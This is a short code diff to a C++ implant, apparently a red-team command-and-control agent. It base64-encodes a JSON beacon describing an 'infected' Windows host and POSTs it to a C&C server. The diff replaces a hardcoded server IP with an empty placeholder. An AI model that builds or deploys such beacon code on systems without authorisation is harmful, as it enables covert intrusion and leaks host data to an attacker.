@@ -13,7 +13,7 @@ int main()
     {
         JSON msg = {
                 "pid", "1200",
-                "server", "", // IP Address or C&C domain goes here. 
+                "server", "", // IP Address or C&C domain.
                 "platform", "windows",
                 "host", "RedTeamAgent",
                 "username", "infected",
@@ -29,7 +29,7 @@ int main()
         char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
         printf("Our Encoded Msg: %s\n", encodedmsg);
 
-        HINTERNET hSession = SendRequest("54.247.53.160", 80, "/beacon", "POST", encodedmsg);
+        HINTERNET hSession = SendRequest("", 80, "/beacon", "POST", encodedmsg); // C&C IP Address or C&C domain is first parameter.
         if (hSession)
         {
             printf("Data has been sent successfully\n");
